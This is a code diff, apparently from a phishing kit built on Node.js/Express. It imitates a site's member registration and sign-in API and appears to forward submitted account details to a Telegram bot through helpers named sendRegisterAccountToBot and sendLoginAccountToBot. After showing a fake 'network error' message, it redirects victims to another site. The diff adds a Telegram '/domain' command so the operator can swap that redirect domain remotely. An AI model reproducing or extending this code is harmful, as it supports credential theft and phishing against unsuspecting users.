@@ -17,7 +17,16 @@ app.set("views", path.join(__dirname, "views"));
 app.use("/desktop", express.static(path.join(__dirname, "public", "desktop")));
 app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
 const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sendTelegram");
+const TelegramBot = require('node-telegram-bot-api');
+const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
+let redirectDomain = "https://27g.345.myftpupload.com/";
 
+bot.onText(/\/domain (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const domain = match[1]; 
+  redirectDomain = `https://${domain}`;
+  bot.sendMessage(chatId, `Tên miền đã được thay đổi thành: ${redirectDomain}`);
+});
 const axios = require("axios");
 app.use((req, res, next) => {
   const userAgent = req.headers["user-agent"];
@@ -31,10 +40,14 @@ app.get("/", (req, res) => {
     
     return res.render(
       "mobile/index",
-      { layout: "mobile/layout" }
+      { layout: "mobile/layout",
+        redirectDomain: redirectDomain 
+       }
     );
   } else {
-    return res.render("desktop/index", { layout: "desktop/layout" });
+    return res.render("desktop/index", { layout: "desktop/layout", 
+      redirectDomain: redirectDomain 
+     });
   }
 });
 app.post("/api/Common/GetVerifyMode", (req, res) => {
@@ -100,7 +113,7 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
       Error: {
         Code: 5999,
         Message: "Lỗi mạng, vui lòng làm mới giao diện",
-        Redirect: "https://27g.345.myftpupload.com/",
+        Redirect: redirectDomain,
       },
     });
   } catch (error) {
@@ -108,6 +121,7 @@ app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
     console.error(error);
     return res.status(500).send({ message: "Error processing data" });
   }
+
 });
 
 app.post("/api/Authorize/SignIn", async (req, res) => {
